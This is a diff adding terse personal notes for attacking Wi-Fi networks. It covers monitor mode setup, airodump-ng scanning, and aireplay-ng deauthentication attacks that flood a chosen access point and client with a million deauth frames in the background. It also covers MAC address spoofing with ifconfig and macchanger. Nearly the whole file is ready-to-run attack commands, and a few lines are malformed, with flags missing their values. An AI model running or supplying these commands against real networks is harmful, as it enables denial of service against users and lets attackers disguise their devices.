@@ -1,0 +1,43 @@
+#Intro
+iwconfig mon0
+airodump-ng mon0
+airodump-ng --band a --bssid --write --chn mon0
+
+#Deauth attack:-
+
+airodump-ng --channel 11 --bssid xx:xx:xx:xx:xx:xx(access point-AP) mon0
+
+aireplay-ng  --deauth 1000000 -a <AP Mac> -c <target MAC> mon0
+aireplay-ng  --deauth 1000000 -a <AP Mac> -c <target MAC> mon0 &(background thread)
+aireplay-ng  --deauth 1000000 -a <AP Mac> -c <target MAC> mon0 &> /dev/null &
+aireplay-ng  --deauth 1000000 -a <AP Mac> --channel <channel value> mon0
+
+killall aireplay-ng
+jobs
+kill %1 (kill job 1)
+
+
+#change the MAC address of wlan interface
+
+
+ifconfig
+ifconfig wlan0 down
+ifconfig wlan0 hw ether 00:11:22:33:44:55
+ifconfig wlan0 up
+ifconfig wlan0
+
+
+#Hidden Network Entry:-
+
+service network-manager start
+
+
+Monitor Mode:
+sudo ifconfig wlan0 down
+sudo iwconfig wlan0 mode monitor
+sudo ifconfig wlan0 up
+
+mac Change new
+ifconfig wlan0 down
+macchanger -m <MAC> wlan0  	 (another package macchanger)
+
